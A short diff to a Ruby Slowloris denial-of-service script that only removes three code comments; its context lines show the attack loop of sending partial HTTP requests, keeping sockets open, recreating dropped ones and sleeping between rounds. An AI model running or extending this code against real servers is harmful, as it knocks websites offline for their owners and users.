@@ -57,7 +57,6 @@ class Slowloris
 
     socket.write("GET /?#{rand(2250)} HTTP/1.1\r\n".encode("utf-8"))
     
-    # headers
     @user_agents.each { |header|
       socket.write("#{header}\r\n".encode("utf-8"))
     }
@@ -128,7 +127,6 @@ HELP_TEXT
 
         $stdout.puts("Sending keep-alive headers... Socket count: #{@parameters[:sockets].size}")
 
-        # recreates dead sockets
         (1..(@parameters[:socket_count] - @parameters[:sockets].size)).each do
           $stdout.puts("Recreating socket...")
           begin
@@ -139,7 +137,6 @@ HELP_TEXT
           end
         end
 
-        # sleeps for a while
         sleep(@parameters[:sleep_time])
       end
     else
